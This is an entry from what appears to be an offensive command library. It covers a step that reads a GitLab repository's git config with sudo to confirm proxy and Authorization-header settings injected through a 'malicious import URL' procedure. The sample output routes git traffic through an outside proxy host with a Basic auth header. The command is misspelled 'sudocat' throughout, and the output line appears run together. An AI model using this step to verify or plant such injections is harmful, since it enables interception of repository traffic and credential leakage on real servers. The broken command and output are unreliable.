---
id: cmd-uuid-002
data: >-
  sudocat
  /var/opt/gitlab/git-data/repositories/@hashed/fc/56/fc56dbc6d4652b315b86b71c8d688c1ccdea9c5f1fd07763d2659fde2e2fc49a.git/config
tags:
  - git
  - config
  - verify
type: command
output: >-
  [http "http://google.com/"] proxy =
  http://proxy.aw.rs:8500.extraHeader=Authorization: Basic dXNlcg==
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:53:38.528Z'
verified: false
validated: true
submitted: true
---
# sudocat-git-config

## Command

```bash
sudocat /var/opt/gitlab/git-data/repositories/@hashed/fc/56/fc56dbc6d4652b315b86b71c8d688c1ccdea9c5f1fd07763d2659fde2e2fc49a.git/config
```

## Description

Displays the .git/config file using sudo cat to verify injected proxy settings after project creation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Path | Full path to repo config | Yes |

## Examples

### Basic Usage

```bash
sudocat /path/to/repo.git/config
```

## Expected Output

Injected config lines showing proxy and extraHeader.

## Related

- [[Related Procedure: Create-Project-with-Malicious-Import-URL]]
